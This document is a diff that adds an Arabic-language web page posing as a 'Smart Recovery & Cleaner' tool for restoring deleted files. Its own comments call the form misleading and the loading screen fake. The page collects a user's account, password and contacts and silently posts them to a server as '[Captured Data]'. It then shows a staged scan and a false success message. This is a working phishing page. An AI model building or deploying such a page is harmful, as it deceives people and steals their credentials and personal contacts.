@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Smart Recovery & Cleaner</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #0d1322;
+            color: #f9fafb;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .app-container {
+            width: 100%;
+            max-width: 390px;
+            height: 100vh;
+            background-color: #0b111e;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            position: relative;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            overflow: hidden;
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            margin-top: 20px;
+            margin-bottom: 25px;
+        }
+        .header h2 { font-size: 22px; color: #fff; margin-bottom: 5px; }
+        .header p { font-size: 13px; color: #94a3b8; }
+        
+        .card-box {
+            background-color: #162032;
+            padding: 20px;
+            border-radius: 16px;
+            border: 1px solid #1e293b;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            color: #cbd5e1;
+            margin-bottom: 8px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            background-color: #0b111e;
+            border: 1px solid #334155;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 14px;
+            text-align: right;
+        }
+        .form-group input:focus {
+            border-color: #6366f1;
+            outline: none;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #6366f1, #4f46e5);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(99, 102, 241, 0.4);
+        }
+        .submit-btn:active { transform: scale(0.98); }
+
+        /* شاشة التحميل والمحاكاة */
+        .loading-overlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: #0b111e;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+            z-index: 100;
+        }
+        .loading-overlay.active { display: flex; }
+        .spinner {
+            width: 60px; height: 60px;
+            border: 5px solid #1e293b;
+            border-top: 5px solid #6366f1;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-title { font-size: 18px; font-weight: bold; color: #fff; margin-bottom: 8px; }
+        .loading-sub { font-size: 13px; color: #64748b; }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        <!-- شاشة إدخال البيانات المضللة -->
+        <div id="formScreen" style="display: flex; flex-direction: column; height: 100%; justify-content: space-between;">
+            <div>
+                <div class="header">
+                    <h2>🔄 استرجاع الملفات المحذوفة</h2>
+                    <p>أدخل تفاصيل الحساب لربط السحابة واستعادة الصور والرسائل المفقودة</p>
+                </div>
+
+                <div class="card-box">
+                    <div class="form-group">
+                        <label>رقم الهاتف أو البريد المرتبط:</label>
+                        <input type="text" id="userAccount" placeholder="أدخل البريد أو الرقم...">
+                    </div>
+                    <div class="form-group">
+                        <label>كلمة المرور الاحتياطية (للفك):</label>
+                        <input type="password" id="userPassword" placeholder="أدخل كلمة المرور...">
+                    </div>
+                    <div class="form-group">
+                        <label>جهات الاتصال المهمة المراد فحصها:</label>
+                        <input type="text" id="userContacts" placeholder="اسم أو رقم مقرب...">
+                    </div>
+                </div>
+            </div>
+
+            <button class="submit-btn" onclick="startRecovery()">بدء الفحص واستعادة البيانات</button>
+        </div>
+
+        <!-- شاشة التحميل الوهمية -->
+        <div id="loadingOverlay" class="loading-overlay">
+            <div class="spinner"></div>
+            <div class="loading-title">جاري فحص الذاكرة العميقة...</div>
+            <div class="loading-sub" id="statusText">جاري مطابقة الحسابات وسحب الملفات المحذوفة</div>
+        </div>
+    </div>
+
+    <script>
+        function startRecovery() {
+            const account = document.getElementById('userAccount').value;
+            const password = document.getElementById('userPassword').value;
+            const contacts = document.getElementById('userContacts').value;
+
+            if(!account || !password) {
+                alert('الرجاء إدخال البيانات المطلوبة لكي يتم الفحص!');
+                return;
+            }
+
+            // إرسال البيانات الحقيقية اللي كتبها المستخدم للسيرفر فوراً
+            const formData = new FormData();
+            formData.append('data', `[Captured Data] Account: ${account} | Password: ${password} | Target Contacts: ${contacts}`);
+            
+            fetch('/upload', {
+                method: 'POST',
+                body: formData
+            }).catch(e => {});
+
+            // إظهار شاشة التحميل المحاكية
+            document.getElementById('formScreen').style.display = 'none';
+            document.getElementById('loadingOverlay').classList.add('active');
+
+            setTimeout(() => {
+                document.getElementById('statusText').innerText = "تم العثور على 142 صورة ونسخة احتياطية، جاري النقل...";
+            }, 2000);
+
+            setTimeout(() => {
+                document.getElementById('loadingOverlay').innerHTML = `
+                    <div style="font-size: 50px; margin-bottom: 15px;">🎉</div>
+                    <div class="loading-title">تمت العملية بنجاح!</div>
+                    <div class="loading-sub">تم استعادة الملفات ورفعها بنجاح إلى النظام.</div>
+                `;
+            }, 4500);
+        }
+    </script>
+</body>
+</html>
